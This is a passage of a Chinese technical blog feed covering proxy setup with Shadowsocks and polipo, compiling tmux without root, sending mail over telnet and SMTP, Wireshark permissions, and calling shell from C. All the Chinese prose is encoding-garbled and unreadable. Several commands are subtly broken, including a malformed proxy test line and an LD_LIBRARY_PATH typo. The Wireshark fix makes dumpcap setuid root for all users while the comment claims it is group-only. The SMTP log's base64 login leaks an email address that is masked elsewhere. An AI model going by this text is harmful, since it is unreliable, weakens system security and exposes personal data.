<li>å¦‚æœæ˜¯å…¬å¸ç½‘è®¾äº†ä»£ç†ï¼Œåˆ™é»˜è®¤è®¾ä¸ºä»£ç†<code>proxy</code>ï¼Œå¹¶åœ¨ä»£ç†<code>proxy</code>ä¸­è®¾ç½®å¥½å…¬å¸çš„ä»£ç†æœåŠ¡å™¨<code>IP</code>å’Œç«¯å£å·<code>port</code>.</li>
</ul>
</li>
<li>åœ¨ä¸‹é¢çš„è§„åˆ™åˆ—è¡¨é…ç½®ä¸­ï¼Œé€‰æ‹©<code>AutoProxy</code>,æ·»åŠ ç½‘å€<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a>ï¼Œ ç„¶åç‚¹å‡»ä¸‹æ–¹æŒ‰é’®æ›´æ–°åˆ—è¡¨ä¿¡æ¯ï¼Œç½‘å€æ— è¯¯çš„è¯ä¼šæç¤ºæˆåŠŸæ›´æ–°è§„åˆ™åˆ—è¡¨ï¼›</li>
<li>ç‚¹å‡»å·¦ä¾§åº”ç”¨ä¿®æ”¹<code>Apply changes</code>ï¼Œåœ¨æ’ä»¶ä¸­é€‰æ‹©<code>auto switch</code>é€‰é¡¹å³å¯å¼€å¯è‡ªåŠ¨åˆ‡æ¢ä»£ç†æ¨¡å¼ã€‚</li>
</ol>
<p>ç»è¿‡ä»¥ä¸Šé…ç½®åï¼Œå¯åŠ¨å·²é…ç½®å¥½æœåŠ¡å™¨ä¿¡æ¯çš„<code>Shadowsocks</code>å®¢æˆ·ç«¯ï¼Œæ­£å¸¸æƒ…å†µä¸‹å°±å¯ä»¥è®¿é—®<code>Google</code>, <code>youtube</code>ç­‰å›½å¤–ç½‘ç«™äº†ã€‚</p>
<h2 id="é…ç½®å…¨å±€ä»£ç†"><a href="#é…ç½®å…¨å±€ä»£ç†" class="headerlink" title="é…ç½®å…¨å±€ä»£ç†"></a>é…ç½®å…¨å±€ä»£ç†</h2><h3 id="ç³»ç»Ÿé…ç½®"><a href="#ç³»ç»Ÿé…ç½®" class="headerlink" title="ç³»ç»Ÿé…ç½®"></a>ç³»ç»Ÿé…ç½®</h3><p>åœ¨<code>Ubuntu</code>ä¸­ï¼Œå¯ä»¥æ‰“å¼€ Settings-&gt;Network-&gt;Network Proxy ï¼Œåœ¨<code>Socks Host</code>ä¸€æ ä¸­è®¾ç½®<code>IP</code>ä¸º<code>127.0.0.1</code>ï¼Œä»£ç†ç«¯å£ä¸º<code>1080</code>ã€‚è¿™æ ·ä¾¿è®¾ç½®å¥½äº†å…¨å±€ä»£ç†ã€‚<code>firefox</code>çš„ç½‘ç»œè®¾ç½®é€‰é¡¹ä¸­æœ‰å•ç‹¬ä¸€é¡¹ç”¨äºé€‰æ‹©ç³»ç»Ÿä»£ç†è®¾ç½®ï¼Œå¯¹åº”çš„å°±æ˜¯è¿™ä¸ªã€‚</p>
<h3 id="å®‰è£…polipo"><a href="#å®‰è£…polipo" class="headerlink" title="å®‰è£…polipo"></a>å®‰è£…polipo</h3><p><code>polipo</code>æ˜¯ä¸€ä¸ªå°å‹çš„ä»£ç†æœåŠ¡å™¨è½¯ä»¶ï¼Œç”¨äºäºŒæ¬¡è½¬å‘æ•°æ®åŒ…ï¼Œä½¿ç”¨å®ƒå¯ä»¥é…åˆç³»ç»Ÿè®¾ç½®é‡Œçš„å…¨å±€ä»£ç†å®ç°çœŸæ­£çš„å…¨å±€ä»£ç†ï¼Œè®©ç»ˆç«¯ç­‰åº”ç”¨éƒ½å¯ä»¥ç¿»è¶Š<code>GFW</code>ï¼Œè¿™æ ·åœ¨<code>shell</code>ä¸­ä¸‹è½½è½¯ä»¶å°±æ–¹ä¾¿å¿«é€Ÿå¤šäº†ï¼Œäº²æµ‹æ•ˆæœå¾ˆæ˜¯æ˜æ˜¾ã€‚</p>
<p>ä¸‹é¢æ˜¯å®‰è£…é…ç½®æ­¥éª¤ï¼š</p>
<pre><code class="bash">$ sudo apt-get install polipo
$ sudo vim /etc/polipo/config
# This file only needs to list configuration variables that deviate
# from the default values.  See /usr/share/doc/polipo/examples/config.sample
# and &quot;polipo -v&quot; for variables you can tweak and further information.
logSyslog = true
logFile = /var/log/polipo/polipo.log
proxyAddress = &quot;0.0.0.0&quot;
socksParentProxy = &quot;127.0.0.1:1080&quot;
socksProxyType = socks5
chunkHighMark = 50331648
objectHighMark = 16384
serverMaxSlots = 64
serverSlots = 16
serverSlots1 = 32
</code></pre>
<p>ä¿®æ”¹<code>config</code>æ–‡ä»¶åéœ€è¦é‡å¯ä¸€ä¸‹<code>polipo</code>ï¼Œç„¶åæµ‹è¯•æ˜¯å¦ä»£ç†æ˜¯å¦æˆåŠŸå¼€å¯ã€‚</p>
<pre><code class="bash">$ sudo /etc/init.d/polipo restart
$ export http_proxy=&quot;http://127.0.0.1:8123/&quot; curl ifconfig.me
***.***.***.*** # return your VPS-IP_ADDR if success
</code></pre>
<p>åˆ°æ­¤å°±å¯ä»¥æ„‰å¿«çš„ä½¿ç”¨è°·æ­Œäº†ï¼Œä½†æ˜¯ç›®å‰æ™šä¸Šçš„ç½‘é€Ÿç•¥æ…¢ï¼Œçœ‹<code>youtube</code>ç»å¸¸åªèƒ½åˆ°<code>360P</code>ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è¿œç¨‹æœåŠ¡å™¨ä¸­ç¼–è¯‘å®‰è£…tmux]]></title>
      <url>https://www.litreily.top/2017/08/23/tmux-install/</url>
      <content type="html"><![CDATA[<p>åœ¨å·¥ä½œå½“ä¸­ï¼Œå…¬å¸å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œéƒ¨ç½²çš„è¿œç¨‹LinuxæœåŠ¡å™¨æ€»æœ‰ä¸€äº›é™åˆ¶ï¼ˆæ²¡ç½‘ï¼ŒShellæŒ‡ä»¤æœ‰é™ï¼‰ï¼Œè€Œä¸”å‘˜å·¥ä½œä¸ºæ™®é€šç”¨æˆ·ï¼Œæ— æ³•å®‰è£…è½¯ä»¶åˆ°é™¤ç”¨æˆ·ç›®å½•ä»¥å¤–çš„ç›®å½•ã€‚å½“æˆ‘ä»¬éœ€è¦ä¸‹è½½å®‰è£…ä¸€äº›å¸¸ç”¨å·¥å…·æ—¶ï¼Œå› ä¸ºæ²¡ç½‘ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨<code>apt-get</code>ç­‰ä¸‹è½½æŒ‡ä»¤ï¼Œåªèƒ½å…ˆåœ¨æœ¬åœ°PCä¸‹è½½è½¯ä»¶æºç ï¼Œç„¶åä¼ å…¥æœåŠ¡å™¨è¿›è¡Œç¼–è¯‘å®‰è£…ã€‚æœ¬æ–‡ä»¥<code>tmux</code>ä¸ºä¾‹è¯´æ˜æœåŠ¡å™¨ä¸­ç¼–è¯‘å®‰è£…è½¯ä»¶çš„æµç¨‹ã€‚</p>
<p>å®‰è£…è·¯å¾„ï¼š<code>~/lib/software/tmux</code></p>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p><code>tmux</code>çš„ä¸‹è½½åœ°å€ : <a href="https://github.com/tmux/tmux/releases/download/2.5/tmux-2.5.tar.gz" target="_blank" rel="noopener">https://github.com/tmux/tmux/releases/download/2.5/tmux-2.5.tar.gz</a></p>
<p>ä¾èµ–åº“<code>libevent</code>ï¼š<a href="https://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gz" target="_blank" rel="noopener">https://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gz</a></p>
<p>ä¸‹è½½åçš„æ–‡ä»¶é€šè¿‡ä¸€å®šæ–¹å¼(scpï¼Œå…±äº«æœåŠ¡ï¼Œ...)å¯ä»¥ä¼ å…¥æœåŠ¡å™¨ä¸­ã€‚</p>
<h2 id="Move-files-optional"><a href="#Move-files-optional" class="headerlink" title="Move files (optional)"></a>Move files (optional)</h2><p>åœ¨æœåŠ¡å™¨ä¸­æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œå°†æ–‡ä»¶æ”¾å…¥<code>~/lib</code>æ–‡ä»¶å¤¹ã€‚</p>
<pre><code class="bash">cd
mkdir lib
cp sharedir.git/*.tar.gz lib/
</code></pre>
<h2 id="Edit-profile"><a href="#Edit-profile" class="headerlink" title="Edit .profile"></a>Edit .profile</h2><p>ç¼–è¾‘<code>.profile</code>ï¼Œæ·»åŠ å…¨å±€å˜é‡<code>SWDIR</code>ï¼ˆå­˜æ”¾ç”¨æˆ·æ‰‹åŠ¨ç¼–è¯‘å®‰è£…çš„è½¯ä»¶ï¼‰ï¼›æ›´æ–°ä¾èµ–åº“<code>LD_LIBRARY_PATH</code>å’Œç¯å¢ƒå˜é‡<code>PATH</code>ï¼Œåˆ†åˆ«æ·»åŠ <code>tmux</code>çš„ä¾èµ–è·¯å¾„å’Œå®‰è£…è·¯å¾„ã€‚</p>
<pre><code class="bash">$ vim ~/.profile
# ...
export SWDIR=/home/&lt;username&gt;/lib/software
export LD_LIBRARY_PATH=$LD_LIBRARY:$SWDIR/libevent/lib

PATH=$PATH:${SWDIR}/tmux/:${SWDIR}/tmux/bin/
</code></pre>
<h2 id="Complie-libevent"><a href="#Complie-libevent" class="headerlink" title="Complie libevent"></a>Complie libevent</h2><p>é…ç½®å¥½ç¯å¢ƒå˜é‡åï¼Œé¦–å…ˆç¼–è¯‘<code>tmux</code>çš„ä¾èµ–åº“<code>libevent</code></p>
<pre><code class="bash">cd ~/lib
tar -xvzf libevent-2.1.8-stable.tar.gz
cd libevent-2.1.8-stable
./autogen.sh
./configure --prefix=$SWDIR/libevent &amp;&amp; make
make install
</code></pre>
<p><strong>è¯´æ˜ï¼š</strong>é»˜è®¤å®‰è£…è·¯å¾„æ˜¯æ²¡æœ‰è®¿é—®æƒé™çš„ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨<code>--prefix</code>é€‰é¡¹æ‰‹åŠ¨æŒ‡å®šå®‰è£…è·¯å¾„è‡³ç”¨æˆ·ç›®å½•ä¸­çš„æŸä¸ªæ–‡ä»¶å¤¹ã€‚</p>
<h2 id="Complie-tmux"><a href="#Complie-tmux" class="headerlink" title="Complie tmux"></a>Complie tmux</h2><pre><code class="bash">cd ~/lib
tar -xvzf tmux-2.5.tar.gz
cd tmux-2.5
./configure --prefix=$SWDIR/tmux CFLAGS=&quot;-I$SWDIR/libevent/include&quot; LDFLAGS=&quot;-L$SWDIR/libevent/lib&quot; &amp;&amp; make
make install
</code></pre>
<p><strong>è¯´æ˜ï¼š</strong><code>CFLAGS</code>å’Œ<code>LDFLAGS</code>ç”¨äºæŒ‡å®šç¼–è¯‘<code>tmux</code>æ‰€éœ€çš„ä¾èµ–åº“æ–‡ä»¶ã€‚</p>
<p>è‡³æ­¤ï¼Œ<code>tmux</code>ä¾¿å®‰è£…å®Œæˆäº†ã€‚åœ¨<code>shell</code>ä¸­è¾“å…¥<code>tmux</code>å³å¯å¯åŠ¨ï¼Œé€šè¿‡<code>man tmux</code>å¯ä»¥æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> tmux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Telnetä¸­ä½¿ç”¨smtpå‘é€é‚®ä»¶]]></title>
      <url>https://www.litreily.top/2017/08/17/telnet-smtp/</url>
      <content type="html"><![CDATA[<p><code>Telnet</code>æ˜¯è¿œç¨‹ç™»å½•æœåŠ¡çš„æ ‡å‡†åè®®å’Œä¸»è¦æ–¹å¼ï¼Œå·¥ä½œäº<code>TCP/IP</code>åè®®æ—çš„åº”ç”¨å±‚ï¼Œå¸¸ç”¨äºè¿œç¨‹ç™»å½•<code>web</code>æœåŠ¡å™¨ï¼Œå…¶ä¸­ä¾¿åŒ…æ‹¬<code>SMTP</code>ï¼Œ<code>POP3</code>ç­‰é‚®ä»¶æœåŠ¡å™¨ã€‚</p>
<p>è¿™å‡ å¤©å‚è€ƒä¹¦ç±ã€Šè®¡ç®—æœºç½‘ç»œ-è‡ªé¡¶å‘ä¸‹æ–¹æ³•ã€‹å­¦ä¹ è®¡ç®—æœºç½‘ç»œçŸ¥è¯†ï¼Œé¡ºä¾¿å°è¯•äº†å¦‚ä½•ä½¿ç”¨<code>Telnet</code>ç™»å½•<code>smtp</code>å‘é€é‚®ä»¶ï¼Œä¸‹é¢é€šè¿‡ä¸€ä¸ªç®€å•ç¤ºä¾‹ä»‹ç»å…·ä½“çš„å‘é€è¿‡ç¨‹ã€‚</p>
<h2 id="Telnet-smtp-163-com-25"><a href="#Telnet-smtp-163-com-25" class="headerlink" title="Telnet smtp.163.com 25"></a>Telnet smtp.163.com 25</h2><p><code>smtp</code>å¯¹åº”çš„ç«¯å£å·ä¸º<code>25</code>ï¼Œä»¥163é‚®ç®±ä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯é‚®ä»¶å‘é€è¿‡ç¨‹ã€‚</p>
<pre><code class="zsh">â†’ ~ telnet smtp.163.com 25
Trying 220.181.12.15...
Connected to smtp.163.com.
Escape character is ^].
220 163.com Anti-spam GT for Coremail System (163com[20141201])
helo 163.com
250 OK
auth login
334 dXNlcm5hbWU6
MTgyNjY2MzI4NzJAMTYzLmNvbQ==
334 UGFzc3dvcmQ6
****************
235 Authentication successful
mail from:&lt;182****2872@163.com&gt;
250 Mail OK
rcpt to:&lt;707***098@qq.com&gt;
250 Mail OK
data
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
From: 182****2872@163.com
To: 707***098@qq.com
Subject: Test the use of smtp

  Hello, litreily.
  This is a message edit with telnet.

Best wish to you.
Litreily
.
250 Mail OK queued as smtp11,D8CowAAnjlqKlZVZXa4QAQ--.18342S2 1502975693
quit
Connection closed by foreign host.
â†’ ~
</code></pre>
<p>ä¸‹é¢åˆ†å¼€å¯¹æ¯ä¸ªè¿‡ç¨‹è¿›è¡Œè§£æï¼Œ<code>C</code>ä»£è¡¨å®¢æˆ·ç«¯ï¼Œå³æœ¬æœºï¼Œ<code>S</code>ä»£è¡¨è¿œç¨‹æœåŠ¡å™¨ç«¯ã€‚æ•´ä¸ªè¿‡ç¨‹åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š</p>
<ul>
<li>æ‰“æ‹›å‘¼</li>
<li>è´¦æˆ·è®¤è¯</li>
<li>å£°æ˜é‚®ç®±åœ°å€</li>
<li>ä¹¦å†™é‚®ä»¶å†…å®¹</li>
<li>é€€å‡º<code>Telnet</code></li>
</ul>
<h3 id="æ‹›å‘¼è¯­"><a href="#æ‹›å‘¼è¯­" class="headerlink" title="æ‹›å‘¼è¯­"></a>æ‹›å‘¼è¯­</h3><pre><code class="bash">S 220 163.com Anti-spam GT for Coremail System (163com[20141201])
C helo 163.com
S 250 OK
</code></pre>
<p><code>220</code>ä»£è¡¨æœåŠ¡å™¨å·²å‡†å¤‡å¥½ï¼Œå®¢æˆ·ç«¯é¦–å…ˆå‘æœåŠ¡å™¨æ‰“ä¸€å£°æ‹›å‘¼<code>helo</code>ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°åè¿”å›ä¸€ä¸ª<code>250</code>åº”ç­”ä¿¡å·ï¼Œä»£è¡¨æ‰“æ‹›å‘¼æˆåŠŸï¼Œä¸‹é¢å¯ä»¥è¿›è¡Œè´¦æˆ·çš„å¯†ç è®¤è¯ã€‚</p>
<h3 id="è´¦æˆ·è®¤è¯"><a href="#è´¦æˆ·è®¤è¯" class="headerlink" title="è´¦æˆ·è®¤è¯"></a>è´¦æˆ·è®¤è¯</h3><pre><code class="bash">C auth login
S 334 dXNlcm5hbWU6
C MTgyNjY2MzI4NzJAMTYzLmNvbQ==
S 334 UGFzc3dvcmQ6
C ****************
S 235 Authentication successful
</code></pre>
<p>å®¢æˆ·ç«¯å‘é€<code>auth login</code>å£°æ˜è‡ªå·±å°†è¿›è¡Œé‚®ç®±è´¦æˆ·çš„ç”¨æˆ·åè®¤è¯å’Œå¯†ç è®¤è¯ã€‚æœåŠ¡å™¨ç«¯è¿”å›ä¸€ä¸ªä»¥<code>334</code>ä»£ç å¼€å¤´çš„æç¤ºä¿¡æ¯ï¼Œä¸å¿…è¿½ç©¶å…¶è¯­ä¹‰ï¼Œè€Œåç”¨æˆ·ä¾æ¬¡è¾“å…¥é€šè¿‡<code>Base64</code>åŠ å¯†çš„é‚®ç®±åå’Œå¯†ç ï¼ŒåŠ å¯†ç½‘å€è§åç»­å‚è€ƒèµ„æ–™ã€‚å½“è¾“å…¥çš„è´¦å·å¯†ç æ— è¯¯æ—¶ï¼ŒæœåŠ¡ç«¯å°†è¿”å›è®¤è¯æˆåŠŸçš„æç¤ºè¯­ã€‚</p>
<h3 id="å£°æ˜é‚®ç®±åœ°å€"><a href="#å£°æ˜é‚®ç®±åœ°å€" class="headerlink" title="å£°æ˜é‚®ç®±åœ°å€"></a>å£°æ˜é‚®ç®±åœ°å€</h3><pre><code class="bash">C mail from:&lt;182****2872@163.com&gt;
S 250 Mail OK
C rcpt to:&lt;707***098@qq.com&gt;
S 250 Mail OK
</code></pre>
<p>è´¦æˆ·å¯†ç è®¤è¯ç»“æŸåï¼Œå®¢æˆ·ç«¯é€šè¿‡<code>mail from:&lt;emailName&gt;</code>ä»¥åŠ<code>rcpt to:&lt;nameEmail&gt;</code>å£°æ˜é‚®ç®±çš„æºåœ°å€å’Œç›®çš„åœ°å€ã€‚</p>
<h3 id="ä¹¦å†™é‚®ä»¶å†…å®¹"><a href="#ä¹¦å†™é‚®ä»¶å†…å®¹" class="headerlink" title="ä¹¦å†™é‚®ä»¶å†…å®¹"></a>ä¹¦å†™é‚®ä»¶å†…å®¹</h3><pre><code class="bash">C data
S 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
C From: 182****2872@163.com
C To: 707***098@qq.com
C Subject: Test the use of smtp
C
C   Hello, litreily.
C   This is a message edit with telnet.
C
C Best wish to you.
C Litreily
C .
S 250 Mail OK queued as smtp11,D8CowAAnjlqKlZVZXa4QAQ--.18342S2 1502975693
</code></pre>
<p>å†™æ˜é‚®ä»¶åœ°å€åï¼Œä½¿ç”¨æŒ‡ä»¤<code>data</code>è¿›å…¥é‚®ä»¶ç¼–è¾‘çŠ¶æ€ï¼ŒæœåŠ¡å™¨ç«¯ä¼šæç¤ºå½“è¾“å…¥<code>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code>æ—¶é€€å‡ºç¼–è¾‘çŠ¶æ€ã€‚</p>
<p>é‚®ä»¶å†…å®¹æœ‰ä¸€å®šçš„æ ¼å¼è¦æ±‚ï¼Œä¸æŒ‰è¦æ±‚éšæ„ä¹¦å†™æœ‰å¯èƒ½è¢«å½“æˆåƒåœ¾é‚®ä»¶æˆ–ä¸åˆæ³•é‚®ä»¶è€Œé€€ä¿¡ã€‚é€šå¸¸éœ€è¦æŒ‡å®šé‚®ä»¶ä¸»é¢˜<code>Subject</code>ï¼Œå…¶å®ƒç›¸å…³ä¿¡æ¯åŒ…æ‹¬æ—¶é—´<code>Date</code>ï¼Œé‚®ä»¶åœ°å€<code>From</code>ï¼Œ<code>To</code>ç­‰ï¼Œç„¶åå†ä¹¦å†™é‚®ä»¶ä¸»ä½“å†…å®¹ï¼Œæ›´è¯¦ç»†çš„æ ¼å¼å¯ä»¥å‚è€ƒæ–‡æ¡£<strong>ã€RFC 821ã€‘</strong>ã€‚ç¼–è¾‘ç»“æŸåï¼Œä»¥å•è¡Œçš„ç‚¹å·<code>.</code>ç»“æŸã€‚å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼ŒæœåŠ¡å™¨ç«¯å°†è¿”å›ä»¥<code>250</code>å¼€å¤´çš„åº”ç­”ä¿¡æ¯ï¼Œå¹¶æç¤ºé‚®ä»¶ä»¥è¿›å…¥<code>smtp</code>çš„å‘é€é˜Ÿåˆ—ã€‚æ­¤æ—¶ä¾¿å¯ä»¥æŸ¥æ”¶é‚®ä»¶äºˆä»¥éªŒè¯äº†ã€‚</p>
<h3 id="é€€å‡ºTelnet"><a href="#é€€å‡ºTelnet" class="headerlink" title="é€€å‡ºTelnet"></a>é€€å‡ºTelnet</h3><pre><code class="bash">C quit
S Connection closed by foreign host.
</code></pre>
<p>å½“é‚®ä»¶å‘é€ç»“æŸåï¼Œå®¢æˆ·ç«¯é€šè¿‡<code>quit</code>é€€å‡º<code>Telnet</code>ã€‚</p>
<h2 id="SMTP-Code"><a href="#SMTP-Code" class="headerlink" title="SMTP Code"></a>SMTP Code</h2><ul>
<li><code>211</code> ç³»ç»ŸçŠ¶æ€æˆ–ç³»ç»Ÿå¸®åŠ©å“åº”</li>
<li><code>214</code> å¸®åŠ©ä¿¡æ¯</li>
<li><code>220</code> æœåŠ¡å°±ç»ª</li>
<li><code>221</code> æœåŠ¡å…³é—­ä¼ è¾“ä¿¡é“</li>
<li><code>235</code> ç”¨æˆ·éªŒè¯æˆåŠŸ</li>
<li><code>250</code> è¦æ±‚çš„é‚®ä»¶æ“ä½œå®Œæˆ</li>
<li><code>251</code> ç”¨æˆ·éæœ¬åœ°ï¼Œå°†è½¬å‘å‘</li>
<li><code>334</code> ç­‰å¾…ç”¨æˆ·è¾“å…¥éªŒè¯ä¿¡æ¯</li>
<li><code>354</code> å¼€å§‹é‚®ä»¶è¾“å…¥ï¼Œä»¥å•è¡Œ<strong>.</strong>ç»“æŸ</li>
<li><code>421</code> æœåŠ¡æœªå°±ç»ªï¼Œå…³é—­ä¼ è¾“ä¿¡é“ï¼ˆå½“å¿…é¡»å…³é—­æ—¶ï¼Œæ­¤åº”ç­”å¯ä»¥ä½œä¸ºå¯¹ä»»ä½•å‘½ä»¤çš„å“åº”ï¼‰</li>
<li><code>450</code> è¦æ±‚çš„é‚®ä»¶æ“ä½œæœªå®Œæˆï¼Œé‚®ç®±ä¸å¯ç”¨ï¼ˆä¾‹å¦‚ï¼Œé‚®ç®±å¿™ï¼‰</li>
<li><code>451</code> æ”¾å¼ƒè¦æ±‚çš„æ“ä½œï¼›å¤„ç†è¿‡ç¨‹ä¸­å‡ºé”™</li>
<li><code>452</code> ç³»ç»Ÿå­˜å‚¨ä¸è¶³ï¼Œè¦æ±‚çš„æ“ä½œæœªæ‰§è¡Œ</li>
<li><code>500</code> æ ¼å¼é”™è¯¯ï¼Œå‘½ä»¤ä¸å¯è¯†åˆ«ï¼ˆæ­¤é”™è¯¯ä¹ŸåŒ…æ‹¬å‘½ä»¤è¡Œè¿‡é•¿ï¼‰</li>
<li><code>501</code> å‚æ•°æ ¼å¼é”™è¯¯</li>
<li><code>502</code> å‘½ä»¤ä¸å¯å®ç°</li>
<li><code>503</code> é”™è¯¯çš„å‘½ä»¤åºåˆ—</li>
<li><code>504</code> å‘½ä»¤å‚æ•°ä¸å¯å®ç°</li>
<li><code>535</code> ç”¨æˆ·éªŒè¯å¤±è´¥</li>
<li><code>550</code> è¦æ±‚çš„é‚®ä»¶æ“ä½œæœªå®Œæˆï¼Œé‚®ç®±ä¸å¯ç”¨ï¼ˆä¾‹å¦‚ï¼Œé‚®ç®±æœªæ‰¾åˆ°ï¼Œæˆ–ä¸å¯è®¿é—®ï¼‰</li>
<li><code>551</code> ç”¨æˆ·éæœ¬åœ°ï¼Œè¯·å°è¯•</li>
<li><code>552</code> è¿‡é‡çš„å­˜å‚¨åˆ†é…ï¼Œè¦æ±‚çš„æ“ä½œæœªæ‰§è¡Œ</li>
<li><code>553</code> é‚®ç®±åä¸å¯ç”¨ï¼Œè¦æ±‚çš„æ“ä½œæœªæ‰§è¡Œï¼ˆä¾‹å¦‚é‚®ç®±æ ¼å¼é”™è¯¯ï¼‰</li>
<li><code>554</code> æ“ä½œå¤±è´¥</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li><code>SMTP</code>æ–‡æ¡£(<code>RFC 821</code>) : <a href="https://tools.ietf.org/pdf/rfc821.pdf" target="_blank" rel="noopener">https://tools.ietf.org/pdf/rfc821.pdf</a></li>
<li><code>SMTP Code</code> : <a href="http://bbs.csdn.net/topics/80275246" target="_blank" rel="noopener">http://bbs.csdn.net/topics/80275246</a></li>
<li><code>163.com</code> é‚®ä»¶é€€ä¿¡ä»£ç  : <a href="http://help.163.com/09/1224/17/5RAJ4LMH00753VB8.html" target="_blank" rel="noopener">http://help.163.com/09/1224/17/5RAJ4LMH00753VB8.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> telnet </tag>
            
            <tag> smtp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ubuntuä¸‹è§£å†³wiresharkæ²¡æœ‰æƒé™çš„é—®é¢˜]]></title>
      <url>https://www.litreily.top/2017/07/28/chmod-wireshark/</url>
      <content type="html"><![CDATA[<p><code>wireshark</code>æ˜¯å¸¸ç”¨çš„ç½‘ç»œæŠ“åŒ…å·¥å…·ï¼Œåœ¨<code>ubuntu</code>ä¸­å®‰è£…æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">sudo aptitude install wireshark
</code></pre>
<p>å®‰è£…ä»¥åï¼Œæ‰“å¼€è½¯ä»¶åï¼Œåœ¨é€‰æ‹©ç½‘ç»œæ¥å£è¿›è¡ŒæŠ“åŒ…æ—¶ä¼šæç¤ºæ²¡æœ‰æƒé™ï¼Œä¸ºæ­¤ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•è§£å†³ã€‚</p>
<pre><code class="bash"># æ·»åŠ ç”¨æˆ·ç»„ï¼Œå‘½åä¸ºwireshark
sudo groupadd wireshark  

# å°†dumpcapæ›´æ”¹ä¸ºåˆšæ·»åŠ çš„ç”¨æˆ·ç»„
sudo chgrp wireshark /usr/bin/dumpcap  

# ä¸ºwiresharkç”¨æˆ·ç»„æ·»åŠ ä½¿ç”¨dumpcapçš„rootæƒé™
sudo chmod 4755 /usr/bin/dumpcap

# å°†è‡ªå·±çš„ç”¨æˆ·(æœ¬äººlitreily)æ·»åŠ åˆ°wiresharkç”¨æˆ·ç»„
sudo gpasswd -a litreily wireshark  
</code></pre>
<p>æ‰§è¡Œå®Œæˆä»¥åä¾¿å¯ä»¥ä½¿ç”¨<code>wireshark</code>æ­£å¸¸æŠ“åŒ…äº†ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Cç¨‹åºä¸Shellè„šæœ¬æ··åˆç¼–ç¨‹]]></title>
      <url>https://www.litreily.top/2017/07/27/mixwith-shell/</url>
      <content type="html"><![CDATA[<p>å¯¹äºåµŒå…¥å¼è½¯ä»¶å¼€å‘ï¼Œæœ‰æ—¶å€™éœ€è¦åœ¨ä½¿ç”¨<code>C</code>è¯­è¨€è¿›è¡Œå¼€å‘çš„åŒæ—¶ï¼ŒåµŒå…¥<code>shell</code>è„šæœ¬æŒ‡ä»¤ï¼Œä»¥å®Œæˆä¸€äº›ç‰¹å®šçš„ä»»åŠ¡ã€‚</p>
<p>æœ¬æ–‡ç»“åˆä¸Šä¸€ç¯‡åšæ–‡â€œåˆæ¢makefileâ€çš„ç¨‹åºä»£ç ï¼ŒåŠ ä¸Šä¸€ä¸ªç®€å•çš„<code>shell</code>è„šæœ¬ï¼Œè¯´æ˜ä¸¤è€…æ··åˆç¼–ç¨‹çš„æ–¹æ³•ã€‚</p>
<h2 id="ç¼–å†™-shell-è„šæœ¬"><a href="#ç¼–å†™-shell-è„šæœ¬" class="headerlink" title="ç¼–å†™ shell è„šæœ¬"></a>ç¼–å†™ shell è„šæœ¬</h2><pre><code class="bash">vim shell.sh
</code></pre>
<p>ä½¿ç”¨<code>vim</code>ç¼–è¾‘å™¨æ–°å»º<code>shell.sh</code>è„šæœ¬æ–‡ä»¶ã€‚</p>
<pre><code class="bash">#!/bin/zsh

echo &quot;Hello world!&quot;
echo &quot;Please input your strings&quot;
read input_string
echo &quot;input_string=$input_string&quot;
</code></pre>
<p>è„šæœ¬é¦–å…ˆè¾“å‡ºä¸€ä¸ªâ€œHello world!â€ï¼Œç„¶åè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å…¥æç¤ºè¯­ï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥åï¼Œæ‰“å°å‡ºç›¸åº”çš„ä¿¡æ¯ã€‚</p>
<h2 id="åœ¨-main-c-ä¸­è°ƒç”¨-shell-è„šæœ¬"><a href="#åœ¨-main-c-ä¸­è°ƒç”¨-shell-è„šæœ¬" class="headerlink" title="åœ¨ main.c ä¸­è°ƒç”¨ shell è„šæœ¬"></a>åœ¨ main.c ä¸­è°ƒç”¨ shell è„šæœ¬</h2><p>ä¸ºäº†åœ¨<code>C</code>æ–‡ä»¶ä¸­è°ƒç”¨<code>shell</code>è„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨<code>stdlib.h</code>åº“ä¸­çš„<code>system</code>å‡½æ•°ï¼Œè°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
